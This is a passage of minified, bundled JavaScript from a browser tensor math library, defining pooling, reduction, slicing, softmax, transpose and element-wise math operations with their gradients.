LogicalOps.logicalNot,n.logicalAnd=l.LogicalOps.logicalAnd,n.logicalOr=l.LogicalOps.logicalOr,n.logicalXor=l.LogicalOps.logicalXor,n.where=l.LogicalOps.where,n.abs=w.UnaryOps.abs,n.acos=w.UnaryOps.acos,n.asin=w.UnaryOps.asin,n.atan=w.UnaryOps.atan,n.ceil=w.UnaryOps.ceil,n.clipByValue=w.UnaryOps.clipByValue,n.cos=w.UnaryOps.cos,n.cosh=w.UnaryOps.cosh,n.elu=w.UnaryOps.elu,n.exp=w.UnaryOps.exp,n.floor=w.UnaryOps.floor,n.leakyRelu=w.UnaryOps.leakyRelu,n.log=w.UnaryOps.log,n.neg=w.UnaryOps.neg,n.prelu=w.UnaryOps.prelu,n.relu=w.UnaryOps.relu,n.selu=w.UnaryOps.selu,n.sigmoid=w.UnaryOps.sigmoid,n.sin=w.UnaryOps.sin,n.sinh=w.UnaryOps.sinh,n.sqrt=w.UnaryOps.sqrt,n.square=w.UnaryOps.square,n.step=w.UnaryOps.step,n.tan=w.UnaryOps.tan,n.tanh=w.UnaryOps.tanh,n.add=o.BinaryOps.add,n.addStrict=o.BinaryOps.addStrict,n.div=o.BinaryOps.div,n.divStrict=o.BinaryOps.divStrict,n.maximum=o.BinaryOps.maximum,n.maximumStrict=o.BinaryOps.maximumStrict,n.minimum=o.BinaryOps.minimum,n.minimumStrict=o.BinaryOps.minimumStrict,n.mul=o.BinaryOps.mul,n.mulStrict=o.BinaryOps.mulStrict,n.pow=o.BinaryOps.pow,n.powStrict=o.BinaryOps.powStrict,n.sub=o.BinaryOps.sub,n.subStrict=o.BinaryOps.subStrict,n.norm=f.NormOps.norm,n.cast=r.ArrayOps.cast,n.clone=r.ArrayOps.clone,n.fromPixels=r.ArrayOps.fromPixels,n.ones=r.ArrayOps.ones,n.onesLike=r.ArrayOps.onesLike,n.zeros=r.ArrayOps.zeros,n.zerosLike=r.ArrayOps.zerosLike,n.rand=r.ArrayOps.rand,n.randomNormal=r.ArrayOps.randomNormal,n.truncatedNormal=r.ArrayOps.truncatedNormal,n.randomUniform=r.ArrayOps.randomUniform,n.reshape=r.ArrayOps.reshape,n.squeeze=r.ArrayOps.squeeze,n.tile=r.ArrayOps.tile,n.gather=r.ArrayOps.gather,n.oneHot=r.ArrayOps.oneHot,n.linspace=r.ArrayOps.linspace,n.range=r.ArrayOps.range,n.buffer=r.ArrayOps.buffer,n.fill=r.ArrayOps.fill,n.tensor=r.ArrayOps.tensor,n.scalar=r.ArrayOps.scalar,n.tensor1d=r.ArrayOps.tensor1d,n.tensor2d=r.ArrayOps.tensor2d,n.tensor3d=r.ArrayOps.tensor3d,n.tensor4d=r.ArrayOps.tensor4d,n.print=r.ArrayOps.print,n.expandDims=r.ArrayOps.expandDims,n.stack=r.ArrayOps.stack,n.pad=r.ArrayOps.pad,n.pad1d=r.ArrayOps.pad1d,n.pad2d=r.ArrayOps.pad2d,n.pad3d=r.ArrayOps.pad3d,n.pad4d=r.ArrayOps.pad4d,n.basicLSTMCell=p.LSTMOps.basicLSTMCell,n.multiRNNCell=p.LSTMOps.multiRNNCell,n.softmax=_.SoftmaxOps.softmax,n.localResponseNormalization=h.LRNOps.localResponseNormalization;var x=t("../tensor"),T=t("../types");x.Tensor,T.Rank,x.Tensor3D,x.Tensor4D,n.losses={softmaxCrossEntropy:_.SoftmaxOps.softmaxCrossEntropy},n.image={resizeBilinear:c.ImageOps.resizeBilinear}},{"../tensor":137,"../types":142,"./array_ops":97,"./batchnorm":99,"./binary_ops":100,"./compare":102,"./concat":103,"./conv":105,"./image_ops":107,"./logical_ops":108,"./lrn":109,"./lstm":110,"./matmul":111,"./norm":112,"./pool":115,"./reduction_ops":118,"./reverse":119,"./slice":121,"./softmax":123,"./transpose":124,"./unary_ops":125}],115:[function(t,e,n){"use strict";var r=this&&this.__decorate||function(t,e,n,r){var i,o=arguments.length,s=o<3?e:null===r?r=Object.getOwnPropertyDescriptor(e,n):r;if("object"==typeof Reflect&&"function"==typeof Reflect.decorate)s=Reflect.decorate(t,e,n,r);else for(var a=t.length-1;a>=0;a--)(i=t[a])&&(s=(o<3?i(s):o>3?i(e,n,s):i(e,n))||s);return o>3&&s&&Object.defineProperty(e,n,s),s};Object.defineProperty(n,"__esModule",{value:!0});var i=t("../doc"),o=t("../environment"),s=t("../util"),a=t("./conv_util"),u=t("./operation"),c=function(){function t(){}return t.maxPool=function(e,n,r,i,u){var c=e,l=!1;3===e.rank&&(l=!0,c=e.as4D(1,e.shape[0],e.shape[1],e.shape[2])),s.assert(4===c.rank,"Error in maxPool: input must be rank 4 but got rank "+c.rank+"."),null!=u&&s.assert(s.isInt(i),"Error in maxPool: pad must be an integer when using, dimRoundingMode "+u+" but got pad "+i+".");var h=a.computePool2DInfo(c.shape,n,r,i,u),p=o.ENV.engine.runKernel((function(t){return t.maxPool(c,h)}),{x:c},(function(e){return{x:function(){return t.maxPoolBackprop(e,c,n,r,i)}}}));return l?p.as3D(p.shape[1],p.shape[2],p.shape[3]):p},t.maxPoolBackprop=function(t,e,n,r,i,u){s.assert(e.rank===t.rank,"Rank of input ("+e.rank+") does not match rank of dy ("+t.rank+")");var c=e,l=t,h=!1;3===e.rank&&(h=!0,c=e.as4D(1,e.shape[0],e.shape[1],e.shape[2]),l=t.as4D(1,t.shape[0],t.shape[1],t.shape[2])),s.assert(4===l.rank,"Error in maxPoolBackprop: dy must be rank 4 but got rank "+l.rank+"."),s.assert(4===c.rank,"Error in maxPoolBackprop: input must be rank 4 but got rank "+c.rank+"."),null!=u&&s.assert(s.isInt(i),"Error in maxPoolBackprop: pad must be an integer when using, dimRoundingMode "+u+" but got pad "+i+".");var p=a.computePool2DInfo(c.shape,n,r,i,u),d=o.ENV.engine.runKernel((function(t){return t.maxPoolBackprop(l,c,p)}),{dy4D:l,input4D:c});return h?d.as3D(d.shape[1],d.shape[2],d.shape[3]):d},t.minPool=function(t,e,n,r,i){var u=t,c=!1;3===t.rank&&(c=!0,u=t.as4D(1,t.shape[0],t.shape[1],t.shape[2])),s.assert(4===u.rank,"Error in minPool: x must be rank 4 but got rank "+u.rank+"."),null!=i&&s.assert(s.isInt(r),"Error in minPool: pad must be an integer when using, dimRoundingMode "+i+" but got pad "+r+".");var l=a.computePool2DInfo(u.shape,e,n,r,i),h=o.ENV.engine.runKernel((function(t){return t.minPool(u,l)}),{input4D:u});return c?h.as3D(h.shape[1],h.shape[2],h.shape[3]):h},t.avgPool=function(e,n,r,i,u){var c=e,l=!1;3===e.rank&&(l=!0,c=e.as4D(1,e.shape[0],e.shape[1],e.shape[2])),s.assert(4===c.rank,"Error in avgPool: x must be rank 4 but got rank "+c.rank+"."),null!=u&&s.assert(s.isInt(i),"Error in avgPool: pad must be an integer when using, dimRoundingMode "+u+" but got pad "+i+".");var h=a.computePool2DInfo(c.shape,n,r,i),p=o.ENV.engine.runKernel((function(t){return t.avgPool(c,h)}),{x:c},(function(e){return{x:function(){return t.avgPoolBackprop(e,c,n,r,i)}}}));return l?p.as3D(p.shape[1],p.shape[2],p.shape[3]):p},t.avgPoolBackprop=function(t,e,n,r,i){s.assert(e.rank===t.rank,"Rank of input ("+e.rank+") does not match rank of dy ("+t.rank+")");var u=e,c=t,l=!1;3===e.rank&&(l=!0,u=e.as4D(1,e.shape[0],e.shape[1],e.shape[2]),c=t.as4D(1,t.shape[0],t.shape[1],t.shape[2])),s.assert(4===c.rank,"Error in avgPoolBackprop: dy must be rank 4 but got rank "+c.rank+"."),s.assert(4===u.rank,"Error in avgPoolBackprop: input must be rank 4 but got rank "+u.rank+".");var h=a.computePool2DInfo(u.shape,n,r,i),p=o.ENV.engine.runKernel((function(t){return t.avgPoolBackprop(c,u,h)}),{dy4D:c,input4D:u});return l?p.as3D(p.shape[1],p.shape[2],p.shape[3]):p},r([i.doc({heading:"Operations",subheading:"Convolution"}),u.operation],t,"maxPool",null),r([u.operation],t,"maxPoolBackprop",null),r([i.doc({heading:"Operations",subheading:"Convolution"}),u.operation],t,"minPool",null),r([i.doc({heading:"Operations",subheading:"Convolution"}),u.operation],t,"avgPool",null),r([u.operation],t,"avgPoolBackprop",null),t}();n.PoolOps=c},{"../doc":25,"../environment":27,"../util":143,"./conv_util":106,"./operation":113}],116:[function(t,e,n){"use strict";Object.defineProperty(n,"__esModule",{value:!0});var r=t("seedrandom"),i=function(){function t(t,e,n,i,o){this.mean=t,this.stdDev=e,this.dtype=n,this.nextVal=NaN,this.truncated=i,this.truncated&&(this.upper=this.mean+2*this.stdDev,this.lower=this.mean-2*this.stdDev);var s=o||Math.random();this.random=r.alea(s.toString())}return t.prototype.nextValue=function(){if(!isNaN(this.nextVal)){var t=this.nextVal;return this.nextVal=NaN,t}for(var e,n,r=!1;!r;){var i=void 0,o=void 0,s=void 0;do{s=(i=2*this.random()-1)*i+(o=2*this.random()-1)*o}while(s>=1||0===s);var a=Math.sqrt(-2*Math.log(s)/s);e=this.mean+this.stdDev*i*a,n=this.mean+this.stdDev*o*a,this.truncated&&!this.isValidTruncated(e)||(r=!0)}return this.truncated&&!this.isValidTruncated(n)||(this.nextVal=this.convertValue(n)),this.convertValue(e)},t.prototype.convertValue=function(t){return null==this.dtype||"float32"===this.dtype?t:Math.round(t)},t.prototype.isValidTruncated=function(t){return t<=this.upper&&t>=this.lower},t}();n.MPRandGauss=i},{seedrandom:146}],117:[function(t,e,n){"use strict";Object.defineProperty(n,"__esModule",{value:!0}),n.PARALLELIZE_THRESHOLD=30,n.computeOptimalWindowSize=function(t){return t<=n.PARALLELIZE_THRESHOLD?t:function(t,e){for(var n=e;n<t;++n)if(t%n==0)return n;return t}(t,Math.floor(Math.sqrt(t)))}},{}],118:[function(t,e,n){"use strict";var r=this&&this.__decorate||function(t,e,n,r){var i,o=arguments.length,s=o<3?e:null===r?r=Object.getOwnPropertyDescriptor(e,n):r;if("object"==typeof Reflect&&"function"==typeof Reflect.decorate)s=Reflect.decorate(t,e,n,r);else for(var a=t.length-1;a>=0;a--)(i=t[a])&&(s=(o<3?i(s):o>3?i(e,n,s):i(e,n))||s);return o>3&&s&&Object.defineProperty(e,n,s),s};Object.defineProperty(n,"__esModule",{value:!0});var i=t("../doc"),o=t("../environment"),s=t("../globals"),a=t("../tensor"),u=t("../util"),c=t("./axis_util"),l=t("./operation"),h=t("./ops"),p=function(){function t(){}return t.logSumExp=function(t,e,n){void 0===e&&(e=null),void 0===n&&(n=!1);var r=c.parseAxisParam(e,t.shape),i=t.max(r,!0),o=t.sub(i).exp().sum(r).log(),s=i.reshape(o.shape).add(o);if(n){var a=c.expandShapeToKeepDim(s.shape,r);return s.reshape(a)}return s},t.sum=function(t,e,n){void 0===e&&(e=null),void 0===n&&(n=!1);var r=c.parseAxisParam(e,t.shape);return s.customGrad((function(t){var e=c.getAxesPermutation(r,t.rank),i=r,s=t;null!=e&&(s=t.transpose(e),i=c.getInnerMostAxes(i.length,t.rank));var u=o.ENV.engine.runKernel((function(t){return t.sum(s,i)}),{permutedX:s});if(n){var l=c.expandShapeToKeepDim(u.shape,r);u=u.reshape(l)}return{value:u,gradFunc:function(e){var n=t.shape.slice();return r.forEach((function(t){n[t]=1})),e.reshape(n).mul(a.Tensor.ones(t.shape,"float32"))}}}))(t)},t.mean=function(t,e,n){void 0===e&&(e=null),void 0===n&&(n=!1);var r=c.parseAxisParam(e,t.shape),i=c.computeOutAndReduceShapes(t.shape,r)[1],o=u.sizeFromShape(i);return s.customGrad((function(t){var i=h.scalar(o);return{value:t.div(i).sum(e,n),gradFunc:function(e){var n=t.shape.slice();return r.forEach((function(t){n[t]=1})),e.reshape(n).mul(a.Tensor.ones(t.shape,"float32")).div(i)}}}))(t)},t.min=function(t,e,n){void 0===e&&(e=null),void 0===n&&(n=!1);var r=c.parseAxisParam(e,t.shape),i=r,s=c.getAxesPermutation(i,t.rank);null!=s&&(t=t.transpose(s),i=c.getInnerMostAxes(i.length,t.rank));var a=o.ENV.engine.runKernel((function(e){return e.min(t,i)}),{x:t});if(n){var u=c.expandShapeToKeepDim(a.shape,r);return a.reshape(u)}return a},t.max=function(t,e,n){void 0===e&&(e=null),void 0===n&&(n=!1);var r=c.parseAxisParam(e,t.shape),i=r,s=c.getAxesPermutation(i,t.rank);null!=s&&(t=t.transpose(s),i=c.getInnerMostAxes(i.length,t.rank));var a=o.ENV.engine.runKernel((function(e){return e.max(t,i)}),{x:t});if(n){var u=c.expandShapeToKeepDim(a.shape,r);return a.reshape(u)}return a},t.argMin=function(t,e){void 0===e&&(e=null);var n=c.parseAxisParam(e,t.shape),r=c.getAxesPermutation(n,t.rank);return null!=r&&(t=t.transpose(r),n=c.getInnerMostAxes(n.length,t.rank)),o.ENV.engine.runKernel((function(e){return e.argMin(t,n)}),{x:t})},t.argMax=function(t,e){void 0===e&&(e=null);var n=c.parseAxisParam(e,t.shape),r=c.getAxesPermutation(n,t.rank);return null!=r&&(t=t.transpose(r),n=c.getInnerMostAxes(n.length,t.rank)),o.ENV.engine.runKernel((function(e){return e.argMax(t,n)}),{x:t})},t.moments=function(t,e,n){void 0===e&&(e=null),void 0===n&&(n=!1);var r=c.parseAxisParam(e,t.shape),i=t.mean(r,n),o=i.shape;n||(o=c.expandShapeToKeepDim(i.shape,r));var s=t.toFloat().sub(i.reshape(o)).square();return{mean:i,variance:s.mean(r,n)}},r([i.doc({heading:"Operations",subheading:"Reduction"}),l.operation],t,"logSumExp",null),r([i.doc({heading:"Operations",subheading:"Reduction"}),l.operation],t,"sum",null),r([i.doc({heading:"Operations",subheading:"Reduction"}),l.operation],t,"mean",null),r([i.doc({heading:"Operations",subheading:"Reduction"}),l.operation],t,"min",null),r([i.doc({heading:"Operations",subheading:"Reduction"}),l.operation],t,"max",null),r([i.doc({heading:"Operations",subheading:"Reduction"}),l.operation],t,"argMin",null),r([i.doc({heading:"Operations",subheading:"Reduction"}),l.operation],t,"argMax",null),r([i.doc({heading:"Operations",subheading:"Normalization"}),l.operation],t,"moments",null),t}();n.ReductionOps=p},{"../doc":25,"../environment":27,"../globals":28,"../tensor":137,"../util":143,"./axis_util":98,"./operation":113,"./ops":114}],119:[function(t,e,n){"use strict";var r=this&&this.__decorate||function(t,e,n,r){var i,o=arguments.length,s=o<3?e:null===r?r=Object.getOwnPropertyDescriptor(e,n):r;if("object"==typeof Reflect&&"function"==typeof Reflect.decorate)s=Reflect.decorate(t,e,n,r);else for(var a=t.length-1;a>=0;a--)(i=t[a])&&(s=(o<3?i(s):o>3?i(e,n,s):i(e,n))||s);return o>3&&s&&Object.defineProperty(e,n,s),s};Object.defineProperty(n,"__esModule",{value:!0});var i=t("../doc"),o=t("../environment"),s=t("../util"),a=t("./axis_util"),u=t("./operation"),c=function(){function t(){}return t.reverse1d=function(e){return s.assert(1===e.rank,"Error in reverse1D: x must be rank 1 but got\n             rank "+e.rank+"."),t.reverse(e,0)},t.reverse2d=function(e,n){return s.assert(2===e.rank,"Error in reverse2D: x must be rank 2 but got\n             rank "+e.rank+"."),t.reverse(e,n)},t.reverse3d=function(e,n){return s.assert(3===e.rank,"Error in reverse3D: x must be rank 3 but got\n             rank "+e.rank+"."),t.reverse(e,n)},t.reverse4d=function(e,n){return s.assert(4===e.rank,"Error in reverse4D: x must be rank 4 but got\n             rank "+e.rank+"."),t.reverse(e,n)},t.reverse=function(t,e){if(0===t.rank)return t.clone();var n=a.parseAxisParam(e,t.shape);return o.ENV.engine.runKernel((function(e){return e.reverse(t,n)}),{x:t},(function(t){return{x:function(){return t.reverse(n)}}})).reshapeAs(t)},r([i.doc({heading:"Tensors",subheading:"Slicing and Joining"}),u.operation],t,"reverse",null),t}();n.ReverseOps=c},{"../doc":25,"../environment":27,"../util":143,"./axis_util":98,"./operation":113}],120:[function(t,e,n){"use strict";Object.defineProperty(n,"__esModule",{value:!0}),n.SELU_SCALEALPHA=1.7580993408473768,n.SELU_SCALE=1.0507009873554805},{}],121:[function(t,e,n){"use strict";var r=this&&this.__decorate||function(t,e,n,r){var i,o=arguments.length,s=o<3?e:null===r?r=Object.getOwnPropertyDescriptor(e,n):r;if("object"==typeof Reflect&&"function"==typeof Reflect.decorate)s=Reflect.decorate(t,e,n,r);else for(var a=t.length-1;a>=0;a--)(i=t[a])&&(s=(o<3?i(s):o>3?i(e,n,s):i(e,n))||s);return o>3&&s&&Object.defineProperty(e,n,s),s};Object.defineProperty(n,"__esModule",{value:!0});var i=t("../doc"),o=t("../environment"),s=t("../util"),a=t("./operation"),u=t("./slice_util"),c=function(){function t(){}return t.slice1d=function(e,n,r){return s.assert(1===e.rank,"slice1d expects a rank-1 tensor, but got a rank-"+e.rank+" tensor"),t.slice(e,[n],[r])},t.slice2d=function(e,n,r){return s.assert(2===e.rank,"slice1d expects a rank-2 tensor, but got a rank-"+e.rank+" tensor"),t.slice(e,n,r)},t.slice3d=function(e,n,r){return s.assert(3===e.rank,"slice1d expects a rank-3 tensor, but got a rank-"+e.rank+" tensor"),t.slice(e,n,r)},t.slice4d=function(e,n,r){return s.assert(4===e.rank,"slice1d expects a rank-4 tensor, but got a rank-"+e.rank+" tensor"),t.slice(e,n,r)},t.slice=function(t,e,n){if(u.assertParamsValid(t,e,n),0===t.rank)throw new Error("Slicing scalar is not possible");var r=t.shape;return o.ENV.engine.runKernel((function(r){return r.slice(t,e,n)}),{x:t},(function(t){for(var i=[],o=0;o<t.rank;o++)i.push([e[o],r[o]-e[o]-n[o]]);return{x:function(){return t.pad(i)}}}))},r([i.doc({heading:"Tensors",subheading:"Slicing and Joining"}),a.operation],t,"slice",null),t}();n.SliceOps=c},{"../doc":25,"../environment":27,"../util":143,"./operation":113,"./slice_util":122}],122:[function(t,e,n){"use strict";Object.defineProperty(n,"__esModule",{value:!0});var r=t("../util");n.assertParamsValid=function(t,e,n){r.assert(t.rank===e.length,"Error in slice"+t.rank+"D: Length of begin "+e+" must match the rank of the array ("+t.rank+")."),r.assert(t.rank===n.length,"Error in slice"+t.rank+"D: Length of size "+n+" must match the rank of the array ("+t.rank+").");for(var i=0;i<t.rank;++i)r.assert(e[i]+n[i]<=t.shape[i],"Error in slice"+t.rank+"D: begin["+i+"] + size["+i+"] ("+(e[i]+n[i])+") would overflow input.shape["+i+"] ("+t.shape[i]+")")}},{"../util":143}],123:[function(t,e,n){"use strict";var r=this&&this.__decorate||function(t,e,n,r){var i,o=arguments.length,s=o<3?e:null===r?r=Object.getOwnPropertyDescriptor(e,n):r;if("object"==typeof Reflect&&"function"==typeof Reflect.decorate)s=Reflect.decorate(t,e,n,r);else for(var a=t.length-1;a>=0;a--)(i=t[a])&&(s=(o<3?i(s):o>3?i(e,n,s):i(e,n))||s);return o>3&&s&&Object.defineProperty(e,n,s),s};Object.defineProperty(n,"__esModule",{value:!0});var i=t("../doc"),o=t("../globals"),s=t("../util"),a=t("./axis_util"),u=t("./operation"),c=t("./ops"),l=function(){function t(){}return t.softmax=function(t,e){if(void 0===e&&(e=-1),-1===e&&(e=t.rank-1),e!==t.rank-1)throw Error("Softmax along a non-last dimension is not yet supported. Logits was rank "+t.rank+" and dim was "+e);return o.customGrad((function(t){var n=t.logSumExp([e],!0),r=t.toFloat().sub(n).exp();return{value:r,gradFunc:function(t){var n=t.mul(r);return n.sub(n.sum([e],!0).mul(r))}}}))(t)},t.softmaxCrossEntropy=function(t,e,n){if(void 0===n&&(n=-1),s.assertShapesMatch(t.shape,e.shape,"Error in softmaxCrossEntropy: "),-1===n&&(n=e.rank-1),n!==e.rank-1)throw Error("Softmax cross entropy along a non-last dimension is not yet supported. Labels / logits was rank "+e.rank+" and dim was "+n);return o.customGrad((function(t,e){var r=e.softmax(n);return{value:c.scalar(1e-5).add(r).log().mul(t).neg().sum([n]),gradFunc:function(e){var i=a.expandShapeToKeepDim(e.shape,[n]);return[e.reshape(i).mul(t.toFloat().sub(r)),e.reshape(i).mul(r.sub(t.toFloat()))]}}}))(t,e)},r([i.doc({heading:"Operations",subheading:"Normalization"}),u.operation],t,"softmax",null),r([i.doc({heading:"Training",subheading:"Losses",namespace:"losses"}),u.operation],t,"softmaxCrossEntropy",null),t}();n.SoftmaxOps=l},{"../doc":25,"../globals":28,"../util":143,"./axis_util":98,"./operation":113,"./ops":114}],124:[function(t,e,n){"use strict";var r=this&&this.__decorate||function(t,e,n,r){var i,o=arguments.length,s=o<3?e:null===r?r=Object.getOwnPropertyDescriptor(e,n):r;if("object"==typeof Reflect&&"function"==typeof Reflect.decorate)s=Reflect.decorate(t,e,n,r);else for(var a=t.length-1;a>=0;a--)(i=t[a])&&(s=(o<3?i(s):o>3?i(e,n,s):i(e,n))||s);return o>3&&s&&Object.defineProperty(e,n,s),s};Object.defineProperty(n,"__esModule",{value:!0});var i=t("../doc"),o=t("../environment"),s=t("../util"),a=t("./axis_util"),u=t("./operation"),c=function(){function t(){}return t.transpose=function(t,e){null==e&&(e=t.shape.map((function(t,e){return e})).reverse());return s.assert(t.rank===e.length,"Error in transpose: rank of input "+t.rank+" must match length of perm "+e+"."),o.ENV.engine.runKernel((function(n){return n.transpose(t,e)}),{x:t},(function(t){var n=a.getUndoAxesPermutation(e);return{x:function(){return t.transpose(n)}}}))},r([i.doc({heading:"Operations",subheading:"Matrices"}),u.operation],t,"transpose",null),t}();n.TransposeOps=c},{"../doc":25,"../environment":27,"../util":143,"./axis_util":98,"./operation":113}],125:[function(t,e,n){"use strict";var r=this&&this.__decorate||function(t,e,n,r){var i,o=arguments.length,s=o<3?e:null===r?r=Object.getOwnPropertyDescriptor(e,n):r;if("object"==typeof Reflect&&"function"==typeof Reflect.decorate)s=Reflect.decorate(t,e,n,r);else for(var a=t.length-1;a>=0;a--)(i=t[a])&&(s=(o<3?i(s):o>3?i(e,n,s):i(e,n))||s);return o>3&&s&&Object.defineProperty(e,n,s),s};Object.defineProperty(n,"__esModule",{value:!0});var i=t("../doc"),o=t("../environment"),s=t("../util"),a=t("./operation"),u=t("./ops"),c=t("./ops"),l=t("./selu_util"),h=function(){function t(){}return t.neg=function(t){return o.ENV.engine.runKernel((function(e){return e.neg(t)}),{x:t},(function(t){return{x:function(){return t.neg()}}}))},t.ceil=function(t){return o.ENV.engine.runKernel((function(e){return e.ceil(t)}),{x:t},(function(t){return{x:function(){return u.zerosLike(t)}}}))},t.floor=function(t){return o.ENV.engine.runKernel((function(e){return e.floor(t)}),{x:t},(function(t){return{x:function(){return u.zerosLike(t)}}}))},t.exp=function(t){return o.ENV.engine.runKernel((function(e,n){return n(e.exp(t))}),{x:t},(function(t,e){var n=e[0];return{x:function(){return t.mulStrict(n)}}}))},t.log=function(t){return o.ENV.engine.runKernel((function(e){return e.log(t)}),{x:t},(function(e){return{x:function(){return e.divStrict(t.toFloat())}}}))},t.sqrt=function(t){return o.ENV.engine.runKernel((function(e){return e.sqrt(t)}),{x:t},(function(e){return{x:function(){return e.divStrict(t.toFloat().sqrt().mul(u.scalar(2)))}}}))},t.square=function(t){return o.ENV.engine.runKernel((function(e){return e.square(t)}),{x:t},(function(e){return{x:function(){return e.mulStrict(t.toFloat().mul(u.scalar(2)))}}}))},t.abs=function(t){return o.ENV.engine.runKernel((function(e){return e.abs(t)}),{x:t},(function(e){return{x:function(){return e.mulStrict(t.toFloat().step(-1))}}}))},t.clipByValue=function(t,e,n){s.assert(e<=n,"Error in clip: min ("+e+") must beless than or equal to max ("+n+").");return o.ENV.engine.runKernel((function(r){return r.clip(t,e,n)}),{x:t},(function(r){return{x:function(){return r.where(t.greater(u.scalar(e)).logicalAnd(t.less(u.scalar(n))),c.zerosLike(r))}}}))},t.relu=function(t){return o.ENV.engine.runKernel((function(e){return e.relu(t)}),{x:t},(function(e){var n=t.step();return{x:function(){return e.mulStrict(n.toFloat())}}}))},t.elu=function(t){return o.ENV.engine.runKernel((function(e){return e.elu(t)}),{x:t},(function(e){return{x:function(){return e.mulStrict(function(t){return o.ENV.engine.runKernel((function(e){return e.eluDer(t)}),{x:t})}(t))}}}))},t.selu=function(t){return o.ENV.engine.runKernel((function(e){return e.selu(t)}),{x:t},(function(e){return{x:function(){var n=t.greater(u.scalar(0)),r=u.scalar(l.SELU_SCALEALPHA),i=u.scalar(l.SELU_SCALE),o=e.mul(i),s=e.mul(r).mul(t.toFloat().exp());return u.where(n,o,s)}}}))},t.leakyRelu=function(t,e){void 0===e&&(e=.2);return o.ENV.engine.runKernel((function(n){return n.leakyRelu(t,e)}),{x:t},(function(n){return{x:function(){return n.mulStrict(t.step(e))}}}))},t.prelu=function(t,e){return o.ENV.engine.runKernel((function(n){return n.prelu(t,e)}),{x:t},(function(n){return{x:function(){return n.mulStrict(function(t,e){return o.ENV.engine.runKernel((function(n){return n.preluDer(t,e)}),{x:t,alpha:e})}(t,e))}}}))},t.sigmoid=function(t){return o.ENV.engine.runKernel((function(e,n){return n(e.sigmoid(t))}),{x:t},(function(t,e){var n=e[0];return{x:function(){return t.mulStrict(n.mul(u.scalar(1).sub(n)))}}}))},t.sin=function(t){return o.ENV.engine.runKernel((function(e){return e.sin(t)}),{x:t},(function(e){return{x:function(){return t.toFloat().cos().mulStrict(e)}}}))},t.cos=function(t){return o.ENV.engine.runKernel((function(e){return e.cos(t)}),{x:t},(function(e){return{x:function(){return t.toFloat().sin().neg().mulStrict(e)}}}))},t.tan=function(t){return o.ENV.engine.runKernel((function(e){return e.tan(t)}),{x:t},(function(e){return{x:function(){return e.divStrict(t.cos().square())}}}))},t.asin=function(e){return o.ENV.engine.runKernel((function(t){return t.asin(e)}),{x:e},(function(n){return{x:function(){return n.divStrict(t.sqrt(u.scalar(1).sub(e.toFloat().square())))}}}))},t.acos=function(e){return o.ENV.engine.runKernel((function(t){return t.acos(e)}),{x:e},(function(n){return{x:function(){return n.divStrict(t.sqrt(u.scalar(1).sub(e.toFloat().square()))).neg()}}}))},t.atan=function(t){return o.ENV.engine.runKernel((function(e){return e.atan(t)}),{x:t},(function(e){return{x:function(){return e.divStrict(u.scalar(1).add(t.toFloat().square()))}}}))},t.sinh=function(t){return o.ENV.engine.runKernel((function(e){return e.sinh(t)}),{x:t},(function(e){return{x:function(){return t.toFloat().cosh().mulStrict(e)}}}))},t.cosh=function(t){return o.ENV.engine.runKernel((function(e){return e.cosh(t)}),{x:t},(function(e){return{x:function(){return t.toFloat().sinh().mulStrict(e)}}}))},t.tanh=function(t){return o.ENV.engine.runKernel((function(e,n){return n(e.tanh(t))}),{x:t},(function(t,e){var n=e[0];return{x:function(){return u.scalar(1).sub(n.square()).mulStrict(t)}}}))},t.step=function(t,e){void 0===e&&(e=0);return o.ENV.engine.runKernel((function(n){return n.step(t,e)}),{x:t},(function(t){return{x:function(){return u.zerosLike(t)}}}))},r([i.doc({heading:"Operations",subheading:"Basic math"}),a.operation],t,"neg",null),r([i.doc({heading:"Operations",subheading:"Basic math"}),a.operation],t,"ceil",null),r([i.doc({heading:"Operations",subheading:"Basic math"}),a.operation],t,"floor",null),r([i.doc({heading:"Operations",subheading:"Basic math"}),a.operation],t,"exp",null),r([i.doc({heading:"Operations",subheading:"Basic math"}),a.operation],t,"log",null),r([i.doc({heading:"Operations",subheading:"Basic math"}),a.operation],t,"sqrt",null),r([i.doc({heading:"Operations",subheading:"Basic math"}),a.operation],t,"square",null),r([i.doc({heading:"Operations",subheading:"Basic math"}),a.operation],t,"abs",null),r([i.doc({heading:"Operations",subheading:"Basic math"}),a.operation],t,"clipByValue",null),r([i.doc({heading:"Operations",subheading:"Basic math"}),a.operation],t,"relu",null),r([i.doc({heading:"Operations",subheading:"Basic math"}),a.operation],t,"elu",null),r([i.doc({heading:"Operations",subheading:"Basic math"}),a.operation],t,"selu",null),r([i.doc({heading:"Operations",subheading:"Basic math"}),a.operation],t,"leakyRelu",null),r([i.doc({heading:"Operations",subheading:"Basic math"}),a.operation],t,"prelu",null),r([i.doc({heading:"Operations",subheading:"Basic math"}),a.operation],t,"sigmoid",null),r([i.doc({heading:"Operations",subheading:"Basic math"}),a.operation],t,"sin",null),r([i.doc({heading:"Operations",subheading:"Basic math"}),a.operation],t,"cos",null),r([i.doc({heading:"Operations",subheading:"Basic math"}),a.operation],t,"tan",null),r([i.doc({heading:"Operations",subheading:"Basic math"}),a.operation],t,"asin",null),r([i.doc({heading:"Operations",subheading:"Basic math"}),a.operation],t,"acos",null),r([i.doc({heading:"Operations",subheading:"Basic math"}),a.operation],t,"atan",null),r([i.doc({heading:"Operations",subheading:"Basic math"}),a.operation],t,"sinh",null),r([i.doc({heading:"Operations",subheading:"Basic math"}),a.operation],t,"cosh",null),r([i.doc({heading:"Operations",subheading:"Basic math"}),a.operation],t,"tanh",null),r([i.doc({heading:"Operations",subheading:"Basic math"}),a.operation],t,"step",null),t}();n.UnaryOps=h},{"../doc":25,"../environment":27,"../util":143,"./operation":113,"./ops":114,"./selu_util":120}],126:[function(t,e,n){"use strict";var r,i=this&&this.__extends||(r=Object.setPrototypeOf||{__proto__:[]}instanceof Array&&function(t,e){t.__proto__=e}||function(t,e){for(var n in e)e.hasOwnProperty(n)&&(t[n]=e[n])},function(t,e){function n(){this.constructor=t}r(t,e),t.prototype=null===e?Object.create(e):(n.prototype=e.prototype,new n)});Object.defineProperty(n,"__esModule",{value:!0});var o=t("../environment"),s=t("../globals"),a=t("../graph/tensor_array_map"),u=t("../ops/ops"),c=t("../tensor"),l=function(t){function e(e,n,r,i){void 0===i&&(i=1e-8);var o=t.call(this,e,r)||this;return o.accumulatedGrads={},o.accumulatedUpdates={},o.accumulatedSquaredGradientsGraph=new a.TensorArrayMap,o.accumulatedUpdatesGraph=new a.TensorArrayMap,o.c=s.keep(u.scalar(-e)),o.epsilon=s.keep(u.scalar(i)),o.rho=s.keep(u.scalar(n)),o.oneMinusRho=s.keep(u.scalar(1-n)),o}return 